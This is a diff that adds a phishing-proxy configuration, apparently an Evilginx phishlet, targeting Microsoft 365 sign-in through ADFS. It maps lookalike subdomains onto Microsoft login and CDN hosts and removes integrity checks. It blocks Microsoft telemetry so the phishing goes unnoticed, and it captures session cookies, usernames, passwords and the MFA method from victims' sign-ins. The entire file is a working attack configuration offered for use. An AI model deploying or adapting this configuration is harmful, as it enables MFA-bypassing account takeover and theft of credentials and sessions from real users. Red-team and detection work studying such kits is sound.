@@ -1,0 +1,62 @@
+name: 'Microsoft 365 with ADFS'
+author: '3ndG4me'
+min_ver: '3.2.0'
+
+proxy_hosts:
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoftonline.com', session: true, is_landing: false}
+  - {phish_sub: 'portal', orig_sub: 'portal', domain: 'microsoftonline.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'account', orig_sub: 'account', domain: 'microsoftonline.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'microsoft.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'aadcdn', orig_sub: 'aadcdn', domain: 'msftauth.net', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'login', orig_sub: 'login', domain: 'live.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'office.com', session: true, is_landing: false}
+  - {phish_sub: 'www', orig_sub: 'www', domain: 'microsoft365.com', session: false, is_landing: false, auto_filter: true}
+  - {phish_sub: 'cdn-1', orig_sub: 'aadcdn', domain: 'msftauth.net', session: true, is_landing: false}
+  - {phish_sub: 'cdn-2', orig_sub: 'aadcdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: 'cdn-3', orig_sub: 'logincdn', domain: 'msauth.net', session: true, is_landing: false}
+  - {phish_sub: 'sso', orig_sub: 'login', domain: 'live.com', session: true, is_landing: false}
+  - {phish_sub: 'm365', orig_sub: 'm365', domain: 'cloud.microsoft', session: true, is_landing: false}
+  - {phish_sub: 'events', orig_sub: 'browser.events.data', domain: 'microsoft.com', session: true, is_landing: false}
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.org', session: true, is_landing: true}
+  - {phish_sub: 'adfs', orig_sub: 'adfs', domain: 'example.org:443', session: true, is_landing: false}
+sub_filters:
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity="[^"]*"', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'login.microsoftonline.com', orig_sub: 'login', domain: 'microsoftonline.com', search: 'integrity=''[^'']*''', replace: '', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'aadcdn.msftauth.net', orig_sub: 'aadcdn', domain: 'msftauth.net', search: '"https:\/\/[^\.]+\.events\.data\.microsoft\.com[^"]*"', replace: '""', mimes: ['text/html', 'application/json', 'text/javascript', 'application/x-javascript']}
+  - {triggers_on: 'adfs.example.org', orig_sub: 'login', domain: 'microsoftonline.com', search: 'href="https://{hostname}', replace: 'href="https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+  - {triggers_on: 'adfs.example.org', orig_sub: 'login', domain: 'microsoftonline.com', search: 'https://{hostname}', replace: 'https://{hostname}', mimes: ['text/html', 'application/json', 'application/javascript']}
+
+intercept:
+  - {domain: 'browser.events.data.microsoft.com', path: '.*', http_status: 403, mime: "application/json"}
+auth_tokens:
+  - domain: '.login.microsoftonline.com'
+    keys: ['ESTSAUTH', 'ESTSAUTHPERSISTENT', 'SignInStateCookie']
+    type: 'cookie'
+credentials:
+  username:
+    key: '(login|UserName)'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: '(passwd|Password|accesspass)'
+    search: '(.*)'
+    type: 'post'
+  custom:
+    - key: 'mfaAuthMethod'
+      search: '(.*)'
+      type: 'post'
+
+login:
+  domain: 'adfs.example.org'
+  path: '/adfs/ls?<valid ADFS URI path goes here>'
+
+force_post:
+  - path: '/adfs/ls?<valid ADFS URI path goes here>'
+    search:
+      - {key: 'wa', search: '.*'}
+      - {key: 'wresult', search: '.*'}
+      - {key: 'wctx', search: '.*'}
+    force:
+       - {key: 'wresult', search: 'https\:\/\/adfs\.example\.org\:443', value: 'https://adfs.example.org'}
+    type: 'post'
